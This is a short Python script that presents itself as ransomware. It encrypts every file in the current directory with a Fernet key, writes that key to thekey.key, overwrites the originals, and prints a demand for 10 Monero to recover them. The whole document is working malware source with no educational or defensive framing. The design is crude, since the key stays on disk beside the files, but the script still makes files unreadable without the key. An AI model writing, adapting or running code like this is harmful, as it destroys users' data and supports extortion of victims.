#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

#file finder

files = []

for file in os.listdir():
	if file == "ransomeware.py" or file == "decrypt.py" or file == "thekey.key" or file == "ransomeware.exe" or file == "decrypt.exe" :
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All your files have been encrypted! Send 10 Monero to this wallet to recive the password to decrypt your files.")
